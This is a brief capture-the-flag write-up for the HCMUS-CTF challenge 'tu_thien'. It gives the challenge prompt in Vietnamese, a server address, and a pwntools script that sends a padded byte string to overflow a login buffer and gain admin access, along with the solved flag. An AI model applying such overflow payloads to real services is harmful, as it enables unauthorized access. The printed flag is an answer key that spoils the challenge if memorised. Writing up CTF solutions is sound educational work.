## tu_thien (50 points)

#### Solved by hieplpvip

```
Toi da tao ra chuc nang dang nhap/dang ky de truy cap vao he thong tu` thie^.n, version 13.67(B). Cac ban dang nhap vao day de gui tien ung ho nhe!

https://mega.nz/folder/jawUxZDS#KFfVkGT3sCp8gUmsaiJyIQ

nc 61.28.237.24 30211

Author: xikhud
```

```py
from pwn import *
conn = remote('61.28.237.24', 30211)
conn.sendline('2' + 'A' * 43 + '\x01')
conn.interactive()

# Type admin for both username and password
```

**Flag:** `HCMUS-CTF{I_wonder_where_that_14B_went}`
